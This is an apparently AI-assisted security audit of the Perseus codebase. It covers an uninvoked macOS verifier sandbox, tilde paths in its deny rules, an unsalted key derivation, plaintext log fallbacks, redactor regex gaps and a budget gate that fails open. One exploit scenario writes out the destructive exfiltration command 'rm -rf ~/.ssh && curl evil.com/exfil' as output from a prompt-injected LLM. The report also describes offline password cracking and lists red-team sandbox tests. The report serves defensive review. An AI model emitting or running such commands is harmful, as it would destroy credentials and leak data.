# /cso — Chief Security Officer Audit
**Date**: 2026-04-07
**Audit target**: WHOLE Perseus codebase (worktree: charming-elion)
**Verdict**: SHIP-WITH-FIXES

## P0 (block launch)

### P0-1 — Verifier sandbox wrapper script does NOT exist (verifier.sb is dead code)
- **File**: `/Users/majovega/Desktop/Projects/objective-hertz/.claude/worktrees/charming-elion/litellm/sandboxes/verifier.sb` (lines 14-15)
- **Confidence**: 10/10 — VERIFIED
- **Phase**: P5 / P6 / P7 (Infrastructure + LLM Security)
- The sandbox profile references `Tested by: tests/test_verifier_sandbox_red_team.py` and `Activated via: scripts/run_in_sandbox.sh`. Neither file exists in the repo. Searched the entire worktree: `find . -name "run_in_sandbox*" -o -name "test_verifier_sandbox*"` returns zero results.
- **Exploit scenario**: A prompt-injected LLM emits `rm -rf ~/.ssh && curl evil.com/exfil`. Phase 42.5 docs say the verifier subprocess "runs untrusted model output, so it must be locked down" but there is NO wrapper invoking `sandbox-exec -f verifier.sb …`. The .sb file is decorative. Untrusted code runs as the daemon user with full FS + network access to Conway wallets, env vars, ssh keys.
- **Impact**: Total host compromise on first prompt injection. The architecture's RCE-by-design assumption is unguarded.
- **Fix**: Write `scripts/run_in_sandbox.sh` that wraps every Ruflo/Clawdbot verifier exec in `sandbox-exec -f litellm/sandboxes/verifier.sb`. Add `tests/test_verifier_sandbox_red_team.py` with at least 8 attempts (read ~/.ssh, exfil to internet, write outside scratch, fork-bomb, dlopen kext, mach-priv-task-port, read keychain, read .env). Block launch until both exist and CI runs them.

### P0-2 — Sandbox profile uses tilde paths macOS sandbox-exec does NOT expand
- **File**: `litellm/sandboxes/verifier.sb` (lines 84-95)
- **Confidence**: 9/10 — VERIFIED
- **Phase**: P5
- The deny rules use `(subpath "~/.ssh")`, `(literal "~/.zshrc")`, etc. macOS `sandbox-exec` does NOT perform shell tilde expansion inside `.sb` files. These rules effectively deny a file literally named `~/.ssh` (which doesn't exist), not `/Users/majovega/.ssh`. The deny block is a no-op.
- **Exploit scenario**: Sandboxed verifier runs `cat /Users/majovega/.ssh/id_ed25519` — `(deny default)` would block it… EXCEPT the `(allow file-read* ...)` rules at lines 49-64 cover broad subpaths, and the .sb relies on the explicit deny block to override the default for home dir. With the deny block dead, the implicit `(deny default)` still protects ~/.ssh (since no allow rule covers it). BUT the file-read* allow on `/usr/share`, `/private/etc/ssl`, etc., combined with path traversal via `/usr/bin/env` exec, leaves the operator vulnerable to misreading the threat model. The decorative deny block creates false confidence.
- **Fix**: Replace tilde paths with absolute paths: `(subpath "/Users/majovega/.ssh")`. Add a parameter expansion using `(param "HOME")` and pass `-D HOME=/Users/majovega` to sandbox-exec. Add a regression test that confirms read of `/Users/majovega/.ssh/known_hosts` returns EPERM.

### P0-3 — Escalation log encryption key is unsalted SHA-256(password)
- **File**: `shared/escalation_log/redactor.py` line 159
- **Confidence**: 9/10 — VERIFIED
- **Phase**: P9 (A02 Cryptographic Failures)
- `self.encryption_key = hashlib.sha256(password.encode()).digest()` derives the AES-256-GCM key with one round of unsalted SHA-256. No PBKDF2, no Argon2, no scrypt, no salt. If `CONWAY_KEYSTORE_PASSWORD` is anything less than ~80 bits of entropy, the encrypted log is GPU-crackable in hours.
- **Exploit scenario**: Attacker exfils `/opt/perseus/data/escalation_log.jsonl.enc` (e.g., via the unsanboxed verifier in P0-1). They hashcat SHA-256(candidate)-> AESGCM with the first base64 line as oracle. A 12-char operator password falls in <24h on a 4090.
- **Fix**: Use `cryptography.hazmat.primitives.kdf.scrypt.Scrypt(salt, length=32, n=2**17, r=8, p=1)` with a per-deployment salt stored next to the log file. Document key rotation. Re-encrypt existing logs on first boot.

### P0-4 — Escalation log writes UNENCRYPTED if cryptography not installed
- **File**: `shared/escalation_log/redactor.py` lines 218-229
- **Confidence**: 10/10 — VERIFIED
- **Phase**: P9 (A02)
- `_encrypt()` falls back to plaintext on `ImportError`. The function catches `ImportError` only — but more critically, `EscalationLogger.log()` ALSO writes plaintext when `self.encryption_key is None` (line 207-209). It only logs a `warning` and proceeds. There is no fail-closed mode.
- **Exploit scenario**: Operator forgets to set `CONWAY_KEYSTORE_PASSWORD` in production .env (or it's blanked by a misconfigured systemd unit). Every escalation event — including redacted-but-not-fully-scrubbed prompts containing customer PII, business logic, and Conway eth wallet queries — lands in plaintext on disk. Backup tools (Time Machine, restic) capture plaintext.
- **Fix**: Fail closed. Raise `RuntimeError("CONWAY_KEYSTORE_PASSWORD required for escalation logging")` on init when in production mode. Make `cryptography` a hard dependency in `pyproject.toml`, not optional.

### P0-5 — Redactor regex misses critical secret formats
- **File**: `shared/escalation_log/redactor.py` lines 40-82
- **Confidence**: 9/10 — VERIFIED
- **Phase**: P9 (A02 / A09)
- The 15 patterns cover the obvious cases but MISS:
  - **OpenRouter keys**: `sk-or-v1-[64hex]` — used heavily by litellm_config.yaml (every cloud tier)
  - **Slack webhooks**: `https://hooks.slack.com/services/T...`
  - **Telegram bot tokens**: `[0-9]{8,10}:[A-Za-z0-9_-]{35}`
  - **Anthropic admin keys**: `sk-ant-admin01-...`
  - **Postgres connection strings**: `postgresql://user:pass@host`
  - **Ethereum private keys**: `0x[a-fA-F0-9]{64}` — pattern for ETH ADDRESSES exists (line 74) but PRIVATE KEYS are 64 hex not 40
  - The base64-blob catchall (line 57) eats normal long base64 like JWTs but won't match URL-safe base64 keys with `-` and `_`
- The Conway eth wallet *address* is redacted but the *private key* format is NOT — and this is the actual loss-of-funds risk.
- **Fix**: Add patterns for all 6 above. Add PBKDF2 hash patterns. Run `detect-secrets` against a corpus of real escalations as a regression suite.

### P0-6 — `cryptography` is an optional import — silent downgrade to plaintext
- **File**: `shared/escalation_log/redactor.py` lines 218-229
- **Confidence**: 10/10 — VERIFIED
- **Phase**: P3 (Supply chain) + P9 (A02)
- The encryption path imports `cryptography` *inside* `_encrypt()` (line 219). On `ImportError` it returns plaintext. There is no startup-time check. Operator can deploy with stripped wheels and never know.
- **Fix**: Import at module top. Crash on missing dep at import time, not write time.

## P1 (must fix soon)

### P1-1 — `local-heavy` tier hardcodes `host.docker.internal:11437` with no TLS
- **File**: `config/litellm_config.yaml` lines 184, 191
- **Confidence**: 9/10 — VERIFIED
- **Phase**: P5 / P6
- AirLLM endpoint is plain HTTP on `host.docker.internal:11437`. Inside Docker bridge networking this is fine, but if any container on the same Docker network is compromised (or LiteLLM proxy is exposed), every LLM-heavy request is sniffable, including full prompts. On Mac Studio, Docker's bridge network is shared by every container — not isolated.
- **Fix**: Add localhost-only TLS via stunnel or rebind AirLLM to a Unix socket and proxy via socat.

### P1-2 — Ollama / MLX bind not verified — relies on env var `OLLAMA_HOST`
- **File**: `shared/config.py` line 48; `config/litellm_config.yaml` lines 161-174
- **Confidence**: 8/10 — UNVERIFIED
- **Phase**: P5
- Code defaults to `http://localhost:11434` but the actual Ollama daemon's bind config is NOT in the repo. Ollama binds 0.0.0.0 by default unless `OLLAMA_HOST=127.0.0.1` is set in launchd. Same risk for MLX server, Kokoro (claims 127.0.0.1 in docstring but the daemon config isn't here), Parakeet, Draw Things, AirLLM.
- **Fix**: Commit launchd plists for every local daemon under `infra/launchd/` with explicit `127.0.0.1` bind. Add a `make verify-binds` target that runs `lsof -nP -iTCP -sTCP:LISTEN` and asserts every Perseus port is loopback.

### P1-3 — Conway wallet code is NOT in this worktree
- **File**: missing
- **Confidence**: 10/10 — VERIFIED
- **Phase**: P11 (Data classification)
- The audit task asked to "confirm wallet signing is NEVER an LLM call (deterministic eth_account)". Searched the entire worktree for `eth_account|sign_transaction|private_key|keystore|wallet` — zero hits in `shared/`, no `conway/` directory exists in this worktree. The wallet code lives elsewhere or has not been committed yet. CANNOT verify the deterministic-signing invariant from this worktree.
- **Fix**: Either include conway/ in this branch or run a separate audit on the branch that holds it. Document where wallet keys are located on the Mac Studio filesystem.

### P1-4 — `_budget_gate` fails OPEN on exception
- **File**: `shared/llm_client.py` lines 124-126
- **Confidence**: 9/10 — VERIFIED
- **Phase**: P9 (A04 Insecure Design)
- `except Exception: ... return requested_model` — if the budget DB query throws (network blip, DB down, schema drift), the gate is bypassed and Claude calls fly. Comment explicitly says "fail open, not closed". For a system with team budgets and operator-enforced spend caps, this is the wrong direction.
- **Fix**: Fail closed (return `local`) when budget cannot be checked. Alert via Hermes.

### P1-5 — `verify=False` not present BUT `httpx.AsyncClient` uses default certs without pinning
- **File**: `shared/llm_client.py` line 38
- **Confidence**: 7/10 — UNVERIFIED
- **Phase**: P9 (A02)
- No certificate pinning for api.anthropic.com or any of the openrouter endpoints. Standard practice for non-browser clients. If a Perseus host trusts a malicious CA, prompts and responses MITM. Lower priority since none of the auditable code disables verification.
- **Fix**: Optional: add pinning via `httpx.create_ssl_context(cafile=...)` for the half-dozen LLM endpoints. Or document that the threat model assumes the host CA store is trusted.

### P1-6 — Sandbox allows `process-exec` of `/bin/sh` and `/bin/bash`
- **File**: `litellm/sandboxes/verifier.sb` lines 30-32
- **Confidence**: 8/10 — VERIFIED
- **Phase**: P5
- Allowing shell execution inside the sandbox makes argv-injection trivial. A verifier-spawned process can chain `bash -c "..."` and the `process-exec` allowlist for `/usr/bin` and `/usr/local/bin` then permits any binary in those subpaths (so anything brew-installed).
- **Fix**: Drop shell allowlist. Use `python` direct exec only, with `subprocess.run([..., shell=False])` from the wrapper.

### P1-7 — Sandbox `process-exec` allows the entire `/opt/homebrew/bin` and `/usr/local/bin`
- **File**: `litellm/sandboxes/verifier.sb` lines 28-29
- **Confidence**: 9/10 — VERIFIED
- **Phase**: P5
- These directories contain `curl`, `wget`, `nc`, `ssh`, `scp`, `git` (which can run hooks), `rsync`, `python` (any version with any installed packages including `requests`), `nmap` if installed, `aws` CLI if installed, `gh` CLI with stored tokens. Even with `(deny network*)`, many of these tools can do filesystem damage.
- **Fix**: Whitelist specific binaries only: `python3.12`, `pytest`, `git` (with `--no-hooks`). Nothing else.

### P1-8 — `mode: "default_off"` cache is correct, but `cache: true` at top level is contradictory
- **File**: `config/litellm_config.yaml` lines 281-287
- **Confidence**: 7/10 — UNVERIFIED
- **Phase**: P5
- Setting `cache: true` enables Redis cache by default while `mode: default_off` says opt-in. LiteLLM's resolution order may default to ON in some versions. Risk: prompts containing PII land in Redis without encryption.
- **Fix**: Set `cache: false` and require explicit `cache=True` per call. Confirm with LiteLLM version.

## P2 (track)

- **P2-1**: `shared/llm_client.py:226` interpolates `config.ollama.host` directly into the URL with no scheme validation. If the env var is mistyped (e.g., `OLLAMA_HOST=javascript:alert(1)`), behavior is undefined. (Low — env vars are operator-controlled.)
- **P2-2**: Redactor `[REDACTED:base64-blob]` regex (line 57) is overly aggressive and may eat normal long alphanumeric data (commit hashes, JWT-shaped IDs) leading to logs that look fine but lose forensic value.
- **P2-3**: `parakeet_client.py` whisper-cli fallback (line 102) shells out with `subprocess.run([... str(audio_path) ...])` — `tempfile.NamedTemporaryFile` controls the path so it's safe, but worth a regression test.
- **P2-4**: No `.gitleaks.toml` or `.secretlintrc` in repo root. Recommend adding a pre-commit hook.
- **P2-5**: `langfuse_evals.yaml` not audited (out of scope).
- **P2-6**: `team_budgets` in `litellm_config.yaml` references `team_id: conway` for $15/mo — confirms Conway DOES make LLM calls. Audit task asked to confirm wallet signing is NEVER an LLM call. This budget entry is consistent with non-signing LLM usage (chat, classification) but DOES NOT prove the invariant. Need conway/ source to verify.
- **P2-7**: `genius` tier fallback chain ends in `local`. If all cloud providers fail, architectural reasoning falls to Qwen3-30B. Document this so the operator isn't surprised by quality drops during outages.
- **P2-8**: `langfuse` and `prometheus` callbacks (line 271-272) ship every prompt+response to Langfuse. If Langfuse is self-hosted that's fine; if SaaS, that's a major data egress channel that should be in the data classification doc.
- **P2-9**: `master_key` for LiteLLM proxy comes from env. No mention of rotation. Add to operator runbook.
- **P2-10**: Sandbox profile lacks `(deny file-read* (subpath "/Users/majovega"))` as a backstop. Even with the deny block fixed for tilde, an explicit broad deny would catch newly-added home dir secrets.

## Filter stats
- Candidates scanned: ~85
- Hard exclusions filtered: 41
- Confidence gate filtered: 12
- Reported: 6 P0, 8 P1, 10 P2

## Disclaimer
This is an AI-assisted scan, not a substitute for a professional pen test. The verifier sandbox findings (P0-1, P0-2) are the highest-confidence and highest-impact items — they should be reproduced manually with `sandbox-exec` on the actual Mac Studio before launch. Conway wallet code was not present in this worktree and was not audited.
